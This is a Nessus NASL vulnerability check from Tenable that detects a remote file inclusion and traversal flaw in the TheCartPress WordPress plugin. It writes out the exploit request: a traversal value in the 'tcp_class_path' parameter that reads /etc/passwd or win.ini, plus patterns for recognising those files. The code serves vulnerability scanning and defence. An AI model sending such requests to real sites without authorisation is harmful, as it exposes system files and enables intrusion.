#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(58385);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2015/09/24 23:21:21 $");

  script_bugtraq_id(49688);
  script_osvdb_id(75616);
  script_xref(name:"EDB-ID", value:"17860");

  script_name(english:"TheCartPress Plugin for WordPress 'tcp_class_path' Parameter Remote File Inclusion");
  script_summary(english:"Attempts to read a file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a remote
file inclusion vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the TheCartPress plugin for WordPress installed on the
remote host does not sanitize input to the 'tcp_class_path' parameter
of its 'checkout/CheckoutEditor.php' script when the 'tcp_save_fields'
is set before using it in a 'require_once()' call.

An unauthenticated, remote attacker could leverage this issue to view
files on the local host or to execute arbitrary PHP code, possibly
taken from third-party hosts.");
  # http://spareclockcycles.org/2011/09/18/exploitring-the-wordpress-extension-repos/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ae4b9b28");
  # http://plugins.trac.wordpress.org/changeset/438950/thecartpress/trunk/checkout/CheckoutEditor.php?old=438924&old_path=thecartpress%2Ftrunk%2Fcheckout%2FCheckoutEditor.php
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c89fe8fb");
  script_set_attribute(attribute:"solution", value:"Upgrade to TheCartPress version 1.1.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"WordPress TheCartPress 1.1.1 RFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/09/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/09/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/03/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "TheCartPress";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "thecartpress/js/tcp_admin_scripts.js"][0] =
    make_list('This file is part of TheCartPress');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');
files = make_list(files, "license.txt");

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['license.txt'] = "GNU GENERAL PUBLIC LICENSE";

foreach file (files)
{
  # Try to exploit the issue.
  if (file[0] == '/') traversal = mult_str(str:"../", nb:12) + '..';
  else traversal = '../../../../';

  url = '/wp-content/plugins/thecartpress/checkout/CheckoutEditor.php?' +
    'tcp_save_fields=true&' +
    'tcp_class_name=' + SCRIPT_NAME + '&' +
    'tcp_class_path=' + traversal + file;

  res = http_send_recv3(port:port, method:"GET", item:dir+url, exit_on_fail:TRUE);

  # There's a problem if...
  body = res[2];
  file_pat = file_pats[file];

  if (
    !isnull(body) &&
    (
      # we see the expected contents or...
      egrep(pattern:file_pat, string:body) ||
      # we get an error claiming the file doesn't exist or...
      traversal+file+"): failed to open stream: No such file" >< body ||
      traversal+file+") [function.require-once]: failed to open stream: No such file" >< body ||
      traversal+file+") [<a href='function.require-once'>function.require-once</a>]: failed to open stream: No such file" >< body ||
      # we get an error about open_basedir restriction.
      traversal+file+") [function.require_once]: failed to open stream: Operation not permitted" >< body ||
      traversal+file+") [<a href='function.require-once'>function.require-once</a>]: failed to open stream: Operation not permitted" >< body ||
      "open_basedir restriction in effect. File("+traversal+file >< body
    )
  )
  {
    if (report_verbosity > 0)
    {
      contents = "";
      foreach line (split(body, keep:FALSE))
        if (!ereg(pattern:'^<(b|br /)>', string:line)) contents += line + '\n';
      contents = chomp(contents);

      if (egrep(pattern:file_pat, string:contents))
      {
        if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

        report = '\n' +
          'Nessus was able to exploit the issue to retrieve the contents of\n' +
          "'" + file + "' from the affected host using the following URL :" + '\n' +
          '\n' +
          '  ' + install_url + url + '\n';

        if (report_verbosity > 1)
        {
          snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
          report += '\n' +
            'This produced the following truncated output :\n' +
            '\n' + snip +
            '\n' + beginning_of_response(resp:contents, max_lines:'10')+
            snip + '\n';
        }
      }
      else
      {
        report = '\n' +
          'Nessus was able to verify the issue exists using the following \n' +
          'URL :\n' +
          '\n' +
          '  ' + install_url + url + '\n';
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
